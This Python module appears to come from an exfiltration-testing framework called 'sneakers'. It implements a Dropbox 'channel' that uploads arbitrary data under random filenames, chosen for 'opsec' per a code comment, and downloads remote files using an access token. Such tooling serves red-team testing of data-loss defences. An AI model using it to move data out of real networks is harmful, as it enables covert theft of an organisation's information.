from sneakers.modules import Channel
from sneakers.errors import ExfilChannel

import dropbox
import string
import random

class Dropboxc(Channel):
    info = {
        "name": "Dropbox",
        "author": "davinerd",
        "description": "Send and receive files through Dropbox",
        "comments": ["If you do not specify a remote filename, the module will pick up a random one"]
    }

    requiredParams = {
        'sending': {
            'token': 'Access token.'
        },
        'receiving': {
            'token': 'Access token.',
            'rfile': 'File to retrieve (absolute remote path starting with /).',
        }
    }

    optionalParams = {
        'sending': {
            'rfile': 'Remote file location.'
        }
    }

    def send(self, data):
        send_params = self.reqParams['sending']
        opt_params = self.optParams['sending']
        dbx = dropbox.Dropbox(send_params['token'])

        # if we're specifying a remote filename
        # it means we don't care about opsec
        if 'rfile' in opt_params:
            upload_filename = opt_params['rfile']
        else:
            chars = string.ascii_uppercase + string.ascii_lowercase
            upload_filename = ''.join(random.choice(chars) for _ in range(8))

        # ensure the path is remote absolute
        if not upload_filename.startswith("/"):
            upload_filename = "/"+upload_filename

        try:
            dbx.files_upload(data, upload_filename)
        except Exception as err:
            raise ExfilChannel("Upload to Dropbox failed: {0}".format(err))

        return upload_filename

    def receive(self):
        rec_params = self.reqParams['receiving']
        remote_file = rec_params['rfile']

        dbx = dropbox.Dropbox(rec_params['token'])
        # ensure the path is remote absolute
        if not remote_file.startswith("/"):
            remote_file = "/"+remote_file

        try:
            res = dbx.files_download(remote_file)
        except Exception as err:
            raise ExfilChannel("Download of {0} failed: {1}".format(remote_file, err))

        return [res[1].content]
